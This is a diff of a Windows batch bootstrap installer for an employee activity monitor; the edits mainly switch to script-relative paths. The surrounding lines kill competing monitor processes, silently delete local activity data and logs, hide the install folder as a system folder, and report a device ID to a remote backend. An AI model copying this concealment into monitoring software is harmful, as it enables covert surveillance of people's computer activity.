@@ -1,4 +1,7 @@
 @echo off
+setlocal
+pushd "%~dp0"
+
 echo ====================================
 echo Employee Monitor Bootstrap Installer
 echo ====================================
@@ -26,16 +29,16 @@ echo Launching main installer...
 set BACKEND_URL=https://eyeing.onrender.com
 if "%INSTALL_ID%"=="" set INSTALL_ID=%RANDOM%%RANDOM%%RANDOM%
 if "%DEVICE_ID%"=="" set DEVICE_ID=%COMPUTERNAME%
-if exist backend_url.txt (
-    for /f "usebackq delims=" %%i in ("backend_url.txt") do (
+if exist "%~dp0backend_url.txt" (
+    for /f "usebackq delims=" %%i in ("%~dp0backend_url.txt") do (
         if not "%%i"=="" set BACKEND_URL=%%i
     )
 )
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$currentPid=$PID; Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -ne $currentPid -and ($_.CommandLine -match 'install_and_run\.py' -or $_.CommandLine -match 'monitor\.py' -or $_.CommandLine -match 'employee-monitor-package') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
 
-if exist "activity_data" rmdir /s /q "activity_data" >nul 2>&1
-if exist "activity_monitor.log" del /f /q "activity_monitor.log" >nul 2>&1
+if exist "%~dp0activity_data" rmdir /s /q "%~dp0activity_data" >nul 2>&1
+if exist "%~dp0activity_monitor.log" del /f /q "%~dp0activity_monitor.log" >nul 2>&1
 
 attrib +h +s "%~dp0" >nul 2>&1
 
@@ -45,6 +48,9 @@ start "" "%BACKEND_URL%/setup.html?autoclose=1^&runMonitor=1^&device_id=%DEVICE_
 
 :skip_setup_open
 
-python install_and_run.py --autostart
+python "%~dp0install_and_run.py" --autostart
 
 pause
+
+popd
+endlocal
